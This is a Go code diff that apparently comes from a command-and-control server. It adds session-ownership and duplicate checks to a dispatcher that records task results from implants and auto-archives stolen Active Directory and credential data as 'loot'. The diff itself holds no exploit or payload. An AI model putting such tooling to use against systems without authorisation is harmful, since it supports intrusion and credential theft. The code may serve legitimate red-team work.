@@ -16,10 +16,10 @@ import (
 type EventCallback func(event *pb.Event)
 
 type Dispatcher struct {
-	sessions    *sessions.Manager
-	store       *db.Store
-	pending     *PendingTasks
-	onEvent     EventCallback
+	sessions *sessions.Manager
+	store    *db.Store
+	pending  *PendingTasks
+	onEvent  EventCallback
 }
 
 func NewDispatcher(sessMgr *sessions.Manager, store *db.Store, onEvent EventCallback) *Dispatcher {
@@ -99,14 +99,37 @@ func (d *Dispatcher) Dispatch(ctx context.Context, sessionID string, taskType pb
 	}
 }
 
-// HandleResult processes a task result from an implant.
-func (d *Dispatcher) HandleResult(result *pb.TaskResult) {
+// HandleResultForSession processes a task result only if the task belongs to sessionID.
+func (d *Dispatcher) HandleResultForSession(sessionID string, result *pb.TaskResult) {
+	d.handleResult(sessionID, result)
+}
+
+func (d *Dispatcher) handleResult(sessionID string, result *pb.TaskResult) {
+	if result == nil {
+		return
+	}
 	log.Printf("[dispatcher] task %s result: success=%v", result.TaskId, result.Success)
 
 	if d.store != nil {
-		d.store.CompleteTask(result.TaskId, result.Success, result.Data, result.Error, result.ExecutionTimeMs)
+		row, err := d.store.GetTask(result.TaskId)
+		if err != nil || row == nil {
+			log.Printf("[dispatcher] rejected result for unknown task %s", result.TaskId)
+			return
+		}
+		if sessionID != "" && row.SessionID != sessionID {
+			log.Printf("[dispatcher] rejected result for task %s from session %s (expected %s)", result.TaskId, sessionID, row.SessionID)
+			return
+		}
+		if row.CompletedAt != nil {
+			log.Printf("[dispatcher] rejected duplicate result for completed task %s", result.TaskId)
+			return
+		}
+		if err := d.store.CompleteTask(result.TaskId, result.Success, result.Data, result.Error, result.ExecutionTimeMs); err != nil {
+			log.Printf("[dispatcher] failed to complete task %s: %v", result.TaskId, err)
+			return
+		}
 		if result.Success && len(result.Data) > 0 {
-			d.maybeStoreLoot(result)
+			d.maybeStoreLoot(row, result)
 		}
 	}
 
@@ -122,12 +145,8 @@ func (d *Dispatcher) HandleResult(result *pb.TaskResult) {
 }
 
 // maybeStoreLoot auto-archives high-value AD/cred task payloads for operator list_loot.
-func (d *Dispatcher) maybeStoreLoot(result *pb.TaskResult) {
-	if d.store == nil || result == nil {
-		return
-	}
-	row, err := d.store.GetTask(result.TaskId)
-	if err != nil || row == nil {
+func (d *Dispatcher) maybeStoreLoot(row *db.TaskRow, result *pb.TaskResult) {
+	if d.store == nil || row == nil || result == nil {
 		return
 	}
 	lootType := ""
